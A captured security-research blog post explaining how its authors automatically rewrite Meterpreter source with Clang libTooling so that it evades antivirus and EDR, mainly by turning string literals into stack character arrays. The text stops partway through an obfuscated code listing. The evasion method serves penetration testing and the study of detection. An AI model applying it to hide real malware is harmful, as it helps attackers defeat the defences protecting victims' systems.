# https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/

<!DOCTYPE html><html lang="en-US" class="js"><body class="wp-singular post-template-default single single-post postid-2586 single-format-standard wp-theme-scrt"><div class="fit-vids-style" id="fit-vids-style" style="display: none;">­</div>
<title>Engineering antivirus evasion – SCRT Team Blog</title>

<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="alternate" type="application/rss+xml" title="SCRT Team Blog » Feed" href="https://blog.scrt.ch/feed/">
<link rel="alternate" type="application/rss+xml" title="SCRT Team Blog » Comments Feed" href="https://blog.scrt.ch/comments/feed/">
<link rel="alternate" type="application/rss+xml" title="SCRT Team Blog » Engineering antivirus evasion Comments Feed" href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/feed/">
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://blog.scrt.ch/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2020%2F06%2F19%2Fengineering-antivirus-evasion%2F">
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://blog.scrt.ch/wp-json/oembed/1.0/embed?url=https%3A%2F%2F%2F2020%2F06%2F19%2Fengineering-antivirus-evasion%2F&amp;format=xml">














<link rel="stylesheet" id="foobox-free-min-css" href="https://blog.scrt.ch/wp-content/plugins/foobox-image-lightbox/free/css/foobox.free.min.css?ver=2.7.41" type="text/css" media="all">
<link rel="stylesheet" id="twentyfifteen-fonts-css" href="https://fonts.googleapis.com/css?family=Noto+Sans%3A400italic%2C700italic%2C400%2C700%7CNoto+Serif%3A400italic%2C700italic%2C400%2C700%7CInconsolata%3A400%2C700&amp;subset=latin%2Clatin-ext" type="text/css" media="all">
<link rel="stylesheet" id="genericons-css" href="https://blog.scrt.ch/wp-content/themes/scrt/genericons/genericons.css?ver=3.2" type="text/css" media="all">
<link rel="stylesheet" id="twentyfifteen-style-css" href="https://blog.scrt.ch/wp-content/themes/scrt/style.css?ver=6.9.1" type="text/css" media="all">
<link rel="stylesheet" id="__EPYT__style-css" href="https://blog.scrt.ch/wp-content/plugins/youtube-embed-plus/styles/ytprefs.min.css?ver=14.1.4.1" type="text/css" media="all">







<link rel="https://api.w.org/" href="https://blog.scrt.ch/wp-json/">
<link rel="alternate" title="JSON" type="application/json" href="https://blog.scrt.ch/wp-json/wp/v2/posts/2586">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.scrt.ch/xmlrpc.php?rsd">

<link rel="canonical" href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">
<link rel="shortlink" href="https://blog.scrt.ch/?p=2586">
<!-- Analytics by WP Statistics v13.2.11 - https://wp-statistics.com/ -->
<link rel="preload" as="style" href="https://blog.scrt.ch/wp-content/plugins/code-prettify/prettify/prettify.css">
<link rel="icon" href="https://blog.scrt.ch/wp-content/uploads/2024/10/cropped-favicon-32x32-1-32x32.png" sizes="32x32">
<link rel="icon" href="https://blog.scrt.ch/wp-content/uploads/2024/10/cropped-favicon-32x32-1-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://blog.scrt.ch/wp-content/uploads/2024/10/cropped-favicon-32x32-1-180x180.png">

		
		<link rel="stylesheet" type="text/css" href="https://blog.scrt.ch/wp-content/plugins/code-prettify/prettify/prettify.css">


<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/#content">Skip to content</a>

	
<!-- .sidebar -->

	<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
<article id="post-2586" class="post-2586 post type-post status-publish format-standard hentry category-antivirus">
	
	<!-- .entry-header -->

	<div class="entry-content">
		
<p><strong>tl;dr:</strong> this blog post documents some aspects of our research on antivirus software and how we managed to automatically refactor Meterpreter to bypass every AV/EDR we were put up against. While the ideas for every technique and the implementation of the string obfuscation pass are detailed below, we decided to publish details on API imports hiding / syscalls rewriting in future blog posts to keep this one as short as possible. The source code is available at <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a></p>



<span id="more-2586"></span>



<hr class="wp-block-separator has-css-opacity">



<p>Among the defensive measures a company can implement to protect its information systems against attacks, security software such as antivirus or EDR often come up as an essential toolset to have. While it used to be rather easy to circumvent any kind of malware detection mechanism in the past years, doing so nowadays certainly involves more effort.</p>



<p>On the other hand, communicating about the risks associated with a vulnerability is really challenging in case the Proof-of-Concept to exploit it is itself blocked by an antivirus. While one can claim that it is always theoretically possible to bypass the detection [1] and leave it at that, actually doing it may add some strength to the argument.</p>



<p>In addition, there are vulnerabilities that can only be discovered with an existing foothold on a system. For example, in the case where a pentester is not able to get that initial level of access, the audit’s result would not accurately depict the actual security level of the systems in scope.</p>



<p>In view of that, there is a need to be able to circumvent antivirus software. To complicate things, at SCRT we rely on publicly available, open-source tools whenever possible, to emphasise that our work is reproducible by anyone skilled enough to use them, and does not depend on private, expensive tools.</p>



<h2 class="wp-block-heading">Problem statement</h2>



<p>The community likes to categorise the detection mechanisms of any antivirus as being “static” or “dynamic”. Generally, if detection is triggered before the malware’s execution, it is seen as a kind of static detection.<br>However, it is worth knowing that a static detection mechanism such as signatures can be invoked during the malware’s execution in reaction to events such as process creations, in-memory file downloads, and so on.<br>In any case, if we want to use the good old Meterpreter against any kind of security software, we must modify it in such a way that it fulfills the following requirements:</p>



<ul class="wp-block-list">
<li>Bypass any static signature, whether during a filesystem scan or a memory scan.</li>



<li>Bypass “behavioural detection” which, more often than not, relates to evading userland API hooking.</li>
</ul>



<p>However, Meterpreter comprises several modules, and the whole codebase amounts to around 700’000 lines of code. In addition, it is constantly updated, which means running a private fork of the project is sure to scale very poorly.</p>



<p>In short, we need a way to transform the codebase automatically.</p>



<h2 class="wp-block-heading">Solutions</h2>



<p>After years of experience bypassing antivirus software, if there is any kind of insight that we could share with the community, it would be that a malware detection is almost always trivially based on strings, API hooks, or a combination of both.</p>



<p>Even for the products that implement machine learning classifiers such as Cylance, a malware that does not have strings, API imports and hookable API calls is sure to go through the net like a soccer ball through Sergio Rico’s defence.</p>



<p>Meterpreter has thousands of strings, API imports are not hidden in any way and sensitive APIs such as “WriteProcessMemory” can be intercepted easily with a userland API hook. So, we need to remedy that in an automated fashion, which yields two potential solutions:</p>



<ul class="wp-block-list">
<li>Source-to-source code refactoring</li>



<li>LLVM passes to obfuscate the code base at compilation time.</li>
</ul>



<p>The latter would be the preferred approach, and many popular researches reached the same conclusion [2]. The main reason is that a transformation pass can be written once and reused independently of the software’s programming language or target architecture.</p>


<div class="wp-block-image fbx-instance">
<figure class="aligncenter"><a href="https://blog.scrt.ch/wp-content/uploads/2020/06/LLVMCompiler1.png" class="fbx-link"><img fetchpriority="high" decoding="async" width="558" height="206" src="https://blog.scrt.ch/wp-content/uploads/2020/06/LLVMCompiler1.png" alt="" class="wp-image-2643"></a><figcaption class="wp-element-caption">Image from: http://www.aosabook.org/en/llvm.html</figcaption></figure>
</div>


<p>However, doing so requires the ability to compile Meterpreter with a compiler other than Visual Studio. While we have published some work to change that in December 2018, adoption in the official codebase is still an ongoing process more than a year later.</p>



<p>In the meantime, we have decided to implement the first approach out of spite. After a thorough review of the state-of-the-art of source code refactoring, <em>libTooling</em> (part of the Clang/LLVM toolchain) appeared to be the only viable candidate to parse C/C++ source code and modify it.</p>



<p>Note: since the codebase is strongly Visual Studio dependent, Clang will fail to parse a large part of Metepreter. However, it was still possible to bypass the target antivirus with that half-success. And here we probably have the only advantage of source-to-source transformation over compile-time transformation: the latter requires the whole project to compile without any errors. The former is resilient to thousands of compilation errors; you just end up with an incomplete Abstract Syntax Tree, which is perfectly fine.</p>



<figure class="wp-block-image"><img decoding="async" width="717" height="348" src="https://blog.scrt.ch/wp-content/uploads/2020/06/45n9vu.jpg" alt="" class="wp-image-2618"><figcaption class="wp-element-caption">LLVM passes vs <em>libTooling</em></figcaption></figure>



<h3 class="wp-block-heading">String obfuscation</h3>



<p>In C/C++, a string may be located in many different contexts. <em>libTooling</em> is not really pleasurable to toy with, so we have applied Pareto’s Law and limited ourselves to those that cover the most suspicious string occurrences within Meterpreter’s codebase:</p>



<ul class="wp-block-list">
<li>Function arguments</li>



<li>List initializers</li>
</ul>



<h4 class="wp-block-heading">Function arguments</h4>



<p>For instance, we know for a fact that ESET Nod32 will flag the string “ntdll” as being suspicious in the following context:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="pln"><span class="pln">ntdll </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LoadLibrary</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">TEXT</span></span><span class="pun"><span class="pun">(</span></span><span class="str"><span class="str">"ntdll"</span></span><span class="pun"><span class="pun">))</span></span></code></pre>



<p>However, rewriting this code snippet in the following manner successfully bypasses the detection:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="typ"><span class="typ">wchar_t</span></span><span class="pln"><span class="pln"> ntdll_str</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
ntdll </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="typ"><span class="typ">LoadLibrary</span></span><span class="pun"><span class="pun">(</span></span><span class="pln"><span class="pln">ntdll_str</span></span><span class="pun"><span class="pun">)</span></span></code></pre>



<p>Behind the scenes, the first snippet will cause the string “<em>ntdll</em>” to be stored inside the <em>.rdata</em> section of the resulting binary, and can be easily spotted by the antivirus. The second snippet will cause the string to be stored on the stack at runtime, and is  statically indistinguishable from code, at least in the general case. <em>IDA Pro</em> or alternatives are often able to recognise the string, but they also run more advanced and computationally intensive analyses on the binary.</p>



<h4 class="wp-block-heading">List initializers</h4>



<p>In <em>Meterpreter’s</em> codebase, this kind of construct can be found in several files, for instance in <em><a href="https://github.com/rapid7/metasploit-payloads/blob/c8aa435b3c4872c58dba04acf53d157c3de2771c/c/meterpreter/source/extensions/extapi/extapi.c#L23">c/meterpreter/source/extensions/extapi/extapi.c</a></em>:</p>



<pre class="wp-block-preformatted prettyprinted" style=""><span class="typ">Command</span><span class="pln"> customCommands</span><span class="pun">[]</span><span class="pln"> </span><span class="pun">=</span><br><span class="pun">{</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_window_enum"</span><span class="pun">,</span><span class="pln"> request_window_enum</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_service_enum"</span><span class="pun">,</span><span class="pln"> request_service_enum</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_service_query"</span><span class="pun">,</span><span class="pln"> request_service_query</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_service_control"</span><span class="pun">,</span><span class="pln"> request_service_control</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_get_data"</span><span class="pun">,</span><span class="pln"> request_clipboard_get_data</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_set_data"</span><span class="pun">,</span><span class="pln"> request_clipboard_set_data</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_start"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_start</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_pause"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_pause</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_resume"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_resume</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_purge"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_purge</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_stop"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_stop</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_clipboard_monitor_dump"</span><span class="pun">,</span><span class="pln"> request_clipboard_monitor_dump</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_adsi_domain_query"</span><span class="pun">,</span><span class="pln"> request_adsi_domain_query</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_ntds_parse"</span><span class="pun">,</span><span class="pln"> ntds_parse</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_wmi_query"</span><span class="pun">,</span><span class="pln"> request_wmi_query</span><span class="pun">),</span><br><span class="pln">    COMMAND_REQ</span><span class="pun">(</span><span class="str">"extapi_pageant_send_query"</span><span class="pun">,</span><span class="pln"> request_pageant_send_query</span><span class="pun">),</span><br><span class="pln">    </span><span class="pun">...</span><br><span class="pun">}</span></pre>



<p>Those strings will be stored in clear-text in the <em>.rdata</em> section of <em>ext_server_espia.x64.dll</em> and picked up by <em>ESET Nod32</em> for instance.</p>



<p>To make things worse, those strings are parameters to a macro, located in a list initialiser. This introduces a bunch of tricky corner cases that are not obvious to overcome. The goal is to rewrite this snippet automatically as follows:</p>



<pre class="wp-block-code prettyprinted" style=""><code class=" prettyprinted" style=""><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_UQOoNXigAPq4</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'w'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'w'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_vhFHmZ8u2hfz</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'v'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_pW25eeIGBeru</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'v'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'q'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'u'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'y'</span></span><span class="pln"><span class="pln">
</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_S4Ws57MYBjib</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'v'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_HJ0lD9Dl56A4</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'g'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_IiEzXils3UsR</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
</span></span><span class="kwd"><span class="kwd">char</span></span><span class="pln"><span class="pln"> hid_extapi_czLOBo0HcqCP</span></span><span class="pun"><span class="pun">[]</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">=</span></span><span class="pln"><span class="pln"> </span></span><span class="pun"><span class="pun">{</span></span><span class="str"><span class="str">'e'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'x'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'c'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'l'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'p'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'b'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'d'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'m'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'n'</span></span><span class="pln"><span class="pln">
</span></span><span class="str"><span class="str">'i'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'o'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'_'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'s'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'a'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'r'</span></span><span class="pun"><span class="pun">,</span></span><span class="str"><span class="str">'t'</span></span><span class="pun"><span class="pun">,</span></span><span class="lit"><span class="lit">0</span></span><span class="pun"><span class="pun">};</span></span><span class="pln"><span class="pln">
